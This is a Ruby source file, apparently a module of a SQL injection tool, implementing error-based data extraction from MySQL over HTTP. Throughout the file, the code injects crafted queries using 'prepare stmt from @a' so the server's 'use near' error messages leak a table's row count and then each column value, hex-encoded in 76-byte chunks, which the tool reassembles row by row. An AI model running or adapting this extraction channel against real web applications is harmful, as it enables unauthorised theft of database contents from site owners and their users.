require 'dataset'

class MySQLReturnChannelViaHTTP
	
	class InvalidVarFormat < Exception
	end

	class CouldNotDetermineQuerySizeException < Exception
	end
	
	class SigInt < Exception
	end

	class ReliabilityException < Exception
		attr_accessor(:current_line, :line_length)

		def initialize(current_line, line_length)
			self.current_line = current_line
			self.line_length = line_length 
		end

		def to_s
			str = "Reliability Exception. (current_line.length=#{@current_line.length},expected line length=#{@line_length}"
			str
		end
	end

	class OrderException < Exception
		attr_accessor(:line_num, :last_line_received, :byte_start, :last_byte_start)

		def initialize(line_num, last_line_received, byte_start, last_byte_start)
			self.line_num = line_num
			self.last_line_received = last_line_received
			self.byte_start = byte_start
			self.last_byte_start = last_byte_start
		end

		def to_s
			str = "Out of order or duplicate line. (line=#{line_num},last_line=#{last_line_received},byte_start=#{byte_start},last_byte_start=#{last_byte_start}"
			str
		end
	end
	
	def MySQLReturnChannelViaHTTP.help
		puts "http channel commands and variables"
		puts " variables:"
		puts "  request_timeout  : timeout in seconds to wait for http output"
	end

	def help
		MySQLReturnChannelViaHTTP.help
	end
	
	def initialize(http, config)
		@tcpdump = nil
		@http = http
		@config = config

		if @config.getv("request_timeout").nil?
			@config.setv("request_timeout",60) #default timeout
		end

		raise HTTPException, "MySQLReturnChannelViaHTTP requires a valid HTTP connection" if (@http.nil?)

		@sql_prefix = @config.getv("sql_prefix")

		@sql_postfix = @config.getv("sql_postfix")
		
	end

	def start(args)

		#the block size was calculated as follows: mysql error snippet is 80 chars - '-' (separator) - 3 (line length)
		@block_size = 76
		@sql_query_get_size = "select @a:=count(#{args['column_name']}) from #{args['table_name']} #{args.include?('where_clause')?args['where_clause']:''};prepare stmt from @a;"
		@sql_query = " select @a:=concat(length(hex(#{args['column_name']})),char(45),mid(hex(#{args['column_name']}),STARTBYTE,#{@block_size})) from #{args['table_name']} #{args.include?('where_clause')?args['where_clause']:''} limit 1 offset LINENUM; prepare stmt from @a;"
			
		@data = DataSet.new(@block_size)

		request = @sql_prefix + @sql_query_get_size + @sql_postfix
		Debug.print(request,2)
		begin
			resp = @http.send(request)
		rescue HTTPException => e
			Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
			raise e
		end

		resp.body =~ /use near '([0-9]+)' at line/

		if $1.nil? 
			raise CouldNotDetermineQuerySizeException
		end

		@line_count = $1.to_i 

		Debug.print("Query returns #{@line_count} rows",2);

	end

	def eachline(&block)

		start_line = 1
		start_byte = 1

		continue = true
		empty_blocks = []
		while continue 

			Debug.print("Getting line #{start_line}",2)
			
			got_lines = false
			timeouts = 0
			while continue
				trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
				#since we're using mysql's 'offset', it's indexed from 0. gotta convert from 1-based to 0-based
				request = @sql_prefix + @sql_query.gsub(/LINENUM/, (start_line-1).to_s).sub(/STARTBYTE/,start_byte.to_s) + @sql_postfix
				Debug.print(request,2)
				begin
					resp = @http.send(request)
				rescue HTTPException => e
					Debug.error("HTTP Error... timing out (or hit Ctrl-C to bust this timeout)")
					raise e
				end
				break if !continue

				Debug.print("#{@line_count} to go. Timeouts seen:#{timeouts}",2)
				blck = getblock(start_line,start_byte,resp)

				continue = false if @data.endofsql?
	
				if !blck.nil?
					if @data.complete?(start_line)
						block.call(start_line, h2a(@data[start_line])) 
						start_line += 1
						@line_count -= 1
						start_byte = 1
					else
						start_byte += @block_size
					end
					#halt asking for more rows if we've reached the last row in the table
					if @line_count == 0
						Debug.print("RowViaHTTP: [#{start_line}] Last line received",2)
						@data.dataset_end(start_line)
						continue = false
					end
				end
			end
		end
	end

	
	private

	def h2a(hex)
		hex.scan(/[0-9a-fA-F][0-9a-fA-F]/).collect {|c| c.hex.chr }.join
	end

	def getblock(line_num, byte_start, resp)
		
		resp.body =~ /use near '([0-9]+)-([0-9a-fA-F]+)' at line/


		#brutish sanity test: we only deal in even-lengthed strings
		raise ReliabilityException.new(line_num, line_length) if $1.to_i % 2 != 0

		line_length = $1.to_i


		if $2.nil?
			returned_row = "" 
		else
			returned_row = $2
		end

		Debug.print("Data segment from HTTP: [#{line_num}:#{byte_start}:#{line_length.to_i}:#{returned_row.length}]",2)
		Debug.print("Data segment from HTTP was: [#{returned_row}:#{h2a(returned_row)}]",2)
		#remember that the line_length is the length of a hex-encoded string. ie. it is double the ASCII string, 
		#so we halve it since we actually want the length of the ASCII string
		if byte_start < line_length
			@data.insert(line_num, byte_start, line_length, returned_row)
		end

		returned_row
	end
end
